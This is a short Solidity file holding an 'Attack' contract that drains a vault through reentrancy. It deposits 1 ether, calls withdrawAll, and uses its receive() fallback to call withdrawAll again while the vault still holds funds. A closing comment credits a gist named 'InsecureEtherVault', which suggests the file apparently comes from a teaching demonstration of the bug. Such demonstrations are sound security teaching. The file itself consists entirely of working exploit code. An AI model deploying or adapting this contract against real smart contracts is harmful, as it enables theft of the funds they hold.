// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.16;

interface IReentrantVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attack {
    IReentrantVault public immutable etherVault;

    constructor(IReentrantVault _etherVault) {
        etherVault = _etherVault;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Original source: https://gist.github.com/serial-coder/5a29d95e1872c960950d4a00b36768e6#file-insecureethervault-sol
